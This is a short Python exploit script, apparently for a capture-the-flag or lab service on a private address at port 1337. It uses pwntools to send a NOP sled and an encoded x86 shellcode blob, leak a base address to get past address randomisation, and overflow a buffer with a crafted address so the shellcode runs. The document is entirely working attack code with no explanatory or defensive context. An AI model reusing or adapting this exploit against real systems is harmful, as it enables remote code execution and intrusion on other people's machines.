from pwn import *

r=remote('192.168.0.64',1337)

shellcode = ""
shellcode += "\xb8\x79\x39\xf4\x07\xdb\xce\xd9\x74\x24\xf4\x5e\x31\xc9"  
shellcode += "\xb1\x30\x83\xee\xfc\x31\x46\x0f\x03\x46\x76\xdb\x01\xfb"  
shellcode += "\x60\x99\xea\x04\x70\xfe\x63\xe1\x41\x3e\x17\x61\xf1\x8e"  
shellcode += "\x53\x27\xfd\x65\x31\xdc\x76\x0b\x9e\xd3\x3f\xa6\xf8\xda"  
shellcode += "\xc0\x9b\x39\x7c\x42\xe6\x6d\x5e\x7b\x29\x60\x9f\xbc\x54"  
shellcode += "\x89\xcd\x15\x12\x3c\xe2\x12\x6e\xfd\x89\x68\x7e\x85\x6e"  
shellcode += "\x38\x81\xa4\x20\x33\xd8\x66\xc2\x90\x50\x2f\xdc\xf5\x5d"  
shellcode += "\xf9\x57\xcd\x2a\xf8\xb1\x1c\xd2\x57\xfc\x91\x21\xa9\x38"  
shellcode += "\x15\xda\xdc\x30\x66\x67\xe7\x86\x15\xb3\x62\x1d\xbd\x30"  
shellcode += "\xd4\xf9\x3c\x94\x83\x8a\x32\x51\xc7\xd5\x56\x64\x04\x6e"  
shellcode += "\x62\xed\xab\xa1\xe3\xb5\x8f\x65\xa8\x6e\xb1\x3c\x14\xc0"  
shellcode += "\xce\x5f\xf7\xbd\x6a\x2b\x15\xa9\x06\x76\x73\x2c\x94\x0c"  
shellcode += "\x31\x2e\xa6\x0e\x65\x47\x97\x85\xea\x10\x28\x4c\x4f\xee"  
shellcode += "\x62\xcd\xf9\x67\x2b\x87\xb8\xe5\xcc\x7d\xfe\x13\x4f\x74"  
shellcode += "\x7e\xe0\x4f\xfd\x7b\xac\xd7\xed\xf1\xbd\xbd\x11\xa6\xbe"  
shellcode += "\x97\x71\x29\x2d\x7b\x76"
###################################choose 2############################

print r.recv()
r.sendline('2')
print r.recv()
r.send('A'*300)
print r.recv()
a='\x90'*100+shellcode
r.send(a)

print r.recvuntil('Title : ')
r.recv(300)
base=u32(r.recv(4))-0x1070
detail=base+0x151c0-0xd000000
print "base:"+hex(base)
print "detail:"+hex(detail)

################################choose 3##################

print r.recv()
r.sendline('3')
print r.recv()
payload='A'*116
payload+=p32(detail)
payload+='A'*30000
r.send(payload)
print r.recv()